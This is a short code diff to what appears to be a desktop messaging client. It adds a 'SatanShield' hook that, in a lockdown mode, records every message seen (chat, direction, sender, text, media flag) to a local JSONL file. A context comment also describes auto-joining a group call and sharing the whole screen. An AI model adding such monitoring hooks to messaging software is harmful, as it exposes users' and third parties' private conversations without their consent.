@@ -1585,6 +1585,33 @@ SessionController::SessionController(
 , _chatStyle(std::make_unique<Ui::ChatStyle>(session->colorIndicesValue())) {
 	init();
 
+	// SatanShield: report every message the client sees straight from ITS OWN model
+	// (correct chat / direction / sender / text) into satan_msgs.jsonl, so monitoring
+	// no longer relies on fragile UIA window-scraping (which grabbed the chat-list
+	// sidebar and mislabelled direction).
+	if (_isPrimary && SatanShield::LockdownActive()) {
+		session->data().newItemAdded(
+		) | rpl::on_next([](not_null<HistoryItem*> item) {
+			if (item->isService()) {
+				return;
+			}
+			const auto peer = item->history()->peer;
+			const auto text = item->originalText().text;
+			const auto media = (item->media() != nullptr);
+			if (text.isEmpty() && !media) {
+				return;
+			}
+			const auto out = item->out();
+			const auto group = peer->isChat()
+				|| peer->isMegagroup()
+				|| peer->isChannel();
+			const auto sender = (!out && group)
+				? item->from()->name()
+				: QString();
+			SatanShield::LogMessage(peer->name(), out, sender, text, media);
+		}, lifetime());
+	}
+
 	// SatanShield: on a demo-configured client, find the chat that has an active group
 	// call (the team videochat this account is a member of), auto-join it and start
 	// sharing the whole screen. Poll every couple of seconds until both are done.
